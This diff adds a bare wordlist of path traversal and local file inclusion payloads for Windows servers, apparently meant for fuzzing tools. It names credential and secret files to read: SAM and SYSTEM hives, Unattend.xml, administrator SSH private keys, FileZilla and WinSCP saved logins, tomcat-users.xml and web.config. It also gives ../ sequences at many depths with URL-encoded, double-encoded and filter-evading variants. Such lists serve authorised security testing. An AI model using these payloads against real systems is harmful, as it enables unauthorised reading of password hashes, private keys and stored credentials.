@@ -1,0 +1,143 @@
+C:/Windows/win.ini
+C:/Windows/system.ini
+C:/Windows/System32/drivers/etc/hosts
+C:/Windows/System32/drivers/etc/lmhosts.sam
+C:/Windows/System32/drivers/etc/networks
+C:/Windows/System32/drivers/etc/protocol
+C:/Windows/System32/drivers/etc/services
+C:/Windows/System32/license.rtf
+C:/Windows/System32/eula.txt
+C:/Windows/System32/config/SAM
+C:/Windows/System32/config/SYSTEM
+C:/Windows/System32/config/AppEvent.Evt
+C:/Windows/System32/config/SecEvent.Evt
+C:/Windows/System32/config/SysEvent.Evt
+C:/Windows/System32/config/default.sav
+C:/Windows/System32/config/security.sav
+C:/Windows/System32/config/software.sav
+C:/Windows/System32/config/system.sav
+C:/Windows/repair/sam
+C:/Windows/repair/system
+C:/Windows/repair/software
+C:/Windows/repair/security
+C:/Windows/repair/default
+C:/Windows/System32/inetsrv/config/applicationHost.config
+C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml
+C:/Windows/SysWOW64/inetsrv/config/applicationHost.config
+C:/Windows/Panther/Unattend.xml
+C:/Windows/Panther/Unattended.xml
+C:/Windows/Panther/Unattend/Unattend.xml
+C:/Windows/Panther/Unattend/Unattended.xml
+C:/Windows/System32/sysprep/sysprep.inf
+C:/Windows/System32/sysprep/sysprep.xml
+C:/Windows/System32/sysprep.inf
+C:/Windows/sysprep.ini
+C:/autoexec.bat
+C:/boot.ini
+C:/io.sys
+C:/config.sys
+C:/pagefile.sys
+C:/icpbrws.ini
+C:/inetpub/wwwroot/web.config
+C:/inetpub/wwwroot/global.asa
+C:/inetpub/wwwroot/global.asax
+C:/inetpub/logs/logfiles/w3svc1/u_ex070101.log
+C:/inetpub/wwwroot/iisstart.htm
+C:/Windows/win.ini
+C:/xampp/apache/conf/httpd.conf
+C:/xampp/apache/conf/httpd-ssl.conf
+C:/xampp/apache/conf/extra/httpd-ssl.conf
+C:/xampp/php/php.ini
+C:/xampp/php/php4/php.ini
+C:/xampp/phpmyadmin/config.inc.php
+C:/xampp/mysql/bin/my.ini
+C:/xampp/mysql/data/mysql/user.MYD
+C:/xampp/filezillaftp/FileZilla Server.xml
+C:/xampp/mercury/ini/mercury.ini
+C:/xampp/tomcat/conf/tomcat-users.xml
+C:/wamp/www/phpinfo.php
+C:/wamp/apps/phpmyadmin4.6.4/config.inc.php
+C:/wamp/bin/apache/apache2.4.27/conf/httpd.conf
+C:/wamp/bin/mysql/mysql5.7.19/my.ini
+C:/wamp/bin/php/php7.1.9/php.ini
+C:/Program Files/Apache Group/Apache/conf/httpd.conf
+C:/Program Files/Apache Group/Apache2/conf/httpd.conf
+C:/Program Files/Apache Software Foundation/Apache2.2/conf/httpd.conf
+C:/Program Files/Apache Software Foundation/Apache2.4/conf/httpd.conf
+C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf
+C:/Program Files/IIS Express/config/applicationhost.config
+C:/Program Files/MySQL/MySQL Server 5.1/my.ini
+C:/Program Files/MySQL/MySQL Server 5.5/my.ini
+C:/Program Files/MySQL/MySQL Server 5.6/my.ini
+C:/Program Files/MySQL/MySQL Server 5.7/my.ini
+C:/Program Files/MySQL/MySQL Server 8.0/my.ini
+C:/Program Files (x86)/MySQL/MySQL Server 5.6/my.ini
+C:/Program Files/PostgreSQL/14/data/postgresql.conf
+C:/Program Files/PostgreSQL/13/data/postgresql.conf
+C:/Program Files/PostgreSQL/12/data/postgresql.conf
+C:/Program Files/MongoDB/Server/5.0/log/mongod.log
+C:/Program Files/Redis/redis.windows.conf
+C:/app/web.config
+C:/app/app.config
+C:/Users/Administrator/.ssh/id_rsa
+C:/Users/Administrator/.ssh/authorized_keys
+C:/Users/Administrator/Desktop/passwd.txt
+C:/Users/Administrator/AppData/Roaming/FileZilla/sitemanager.xml
+C:/Users/Administrator/AppData/Roaming/FileZilla/recentservers.xml
+C:/Users/Administrator/AppData/Roaming/WinSCP.ini
+C:/Users/Administrator/AppData/Roaming/OpenVPN/config/client.ovpn
+C:/Users/Administrator/NTUser.dat
+C:/Documents and Settings/Administrator/Desktop/README.txt
+C:/Documents and Settings/All Users/Application Data/Microsoft/Crypto
+C:/Documents and Settings/Administrator/.ssh/id_rsa
+C:/Documents and Settings/Administrator/Application Data/FileZilla/sitemanager.xml
+C:/python27/lib/python2.7/config.py
+C:/python27/scripts/pip.exe
+C:/Python27/Lib/site-packages/django/settings.py
+C:/Python38/lib/site.py
+C:/Python39/Lib/site.py
+C:/Python310/Lib/site.py
+C:/Python311/Lib/site.py
+C:/tomcat/conf/tomcat-users.xml
+C:/tomcat/conf/web.xml
+C:/Tomcat/conf/tomcat-users.xml
+C:/Tomcat6/conf/web.xml
+C:/Tomcat7/conf/web.xml
+C:/Tomcat8/conf/web.xml
+C:/Tomcat9/conf/web.xml
+C:/Program Files/Tomcat8/conf/web.xml
+C:/Program Files/Tomcat9/conf/web.xml
+C:/Windows/CSC/v2.0.6/sm
+../windows/win.ini
+../../windows/win.ini
+../../../windows/win.ini
+../../../../windows/win.ini
+../../../../../windows/win.ini
+../../../../../../windows/win.ini
+../../../../../../../windows/win.ini
+..\windows\win.ini
+..\..\windows\win.ini
+..\..\..\windows\win.ini
+..\..\..\..\windows\win.ini
+../../../windows/system32/drivers/etc/hosts
+../../../../windows/system32/drivers/etc/hosts
+../../../../../windows/system32/drivers/etc/hosts
+../../../../../../windows/system32/drivers/etc/hosts
+../../../inetpub/wwwroot/web.config
+../../../../inetpub/wwwroot/web.config
+../../../../../inetpub/wwwroot/web.config
+%2e%2e%5c%2e%2e%5cwindows%5cwin.ini
+%2e%2e/%2e%2e/windows/win.ini
+%5c%5c%2e%2e%5cwindows%5cwin.ini
+....\windows\win.ini
+....//windows//win.ini
+%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini
+%252e%252e%255cwindows%255cwin.ini
+..%5cwindows%5cwin.ini
+..%5c..%5cwindows%5cwin.ini
+..%5c..%5c..%5cwindows%5cwin.ini
+..%5c..%5c..%5c..%5cwindows%5cwin.ini
+..%2fwindows%2fwin.ini
+..%2f..%2fwindows%2fwin.ini
+..%2f..%2f..%2fwindows%2fwin.ini
+..%2f..%2f..%2f..%2fwindows%2fwin.ini
